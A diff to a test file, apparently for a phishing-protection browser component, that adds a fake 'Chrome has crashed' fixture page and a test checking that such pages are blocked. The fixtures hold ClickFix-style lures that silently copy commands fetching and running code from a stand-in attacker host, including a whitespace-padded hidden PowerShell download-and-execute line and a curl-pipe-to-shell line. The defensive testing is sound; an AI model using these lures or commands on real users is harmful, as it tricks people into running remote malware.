@@ -19,6 +19,9 @@ const PAGES: Record<string, string> = {
   "/clickfix": `<!doctype html><title>Just a moment</title>
     <h1>Verify you are human</h1><p>1. Press Windows + R  2. Press Ctrl + V  3. Press Enter</p>
     <button id="verify" onclick="var t=document.createElement('textarea');var cmd='powershell -w hidden -c iex(irm http://evil.test/p)';var pad=' '.repeat(13000)+String.fromCharCode(160,8192,12288,8203);t.value=pad+cmd+' #'+'a'.repeat(13000);t.style.position='fixed';t.style.left='-9999px';document.body.appendChild(t);t.select();document.execCommand('copy');">I'm not a robot</button>`,
+  "/crashfix": `<!doctype html><title>Aw, Snap</title>
+    <h1>Chrome has crashed</h1><p>Your browser is out of date. Paste the fix.</p>
+    <button id="fix" onclick="var t=document.createElement('textarea');t.value='curl -fsSL https://evil.test/fix.sh | sh';t.style.position='fixed';t.style.left='-9999px';document.body.appendChild(t);t.select();document.execCommand('copy');">Fix Chrome</button>`,
   "/installer": `<!doctype html><title>Install</title><h1>Install the CLI</h1>
     <button id="copy" onclick="var t=document.createElement('textarea');t.value='curl -fsSL https://example.test/install.sh | sh';t.style.position='fixed';t.style.left='-9999px';document.body.appendChild(t);t.select();document.execCommand('copy');">Copy</button>`,
   "/account": `<!doctype html><title>Sign in</title>
@@ -164,6 +167,15 @@ test("the worker loads the popularity list: a brand's secondary domain is not a 
 test("a kit on a popular platform does not borrow the platform's reputation", async () => {
   const page = await freshPage();
   await page.goto(`http://paypal-login.weebly.com:${port}/account`).catch(() => undefined);
+  await expect.poll(() => page.url(), { timeout: 8000 }).toContain("warning.html");
+  await page.close();
+});
+
+test("a fake browser-crash page cannot copy a shell command", async () => {
+  await context.grantPermissions(["clipboard-read", "clipboard-write"]);
+  const page = await freshPage();
+  await page.goto(`http://cdn-check.example:${port}/crashfix`);
+  await page.locator("#fix").click();
   await expect.poll(() => page.url(), { timeout: 8000 }).toContain("warning.html");
   await page.close();
 });
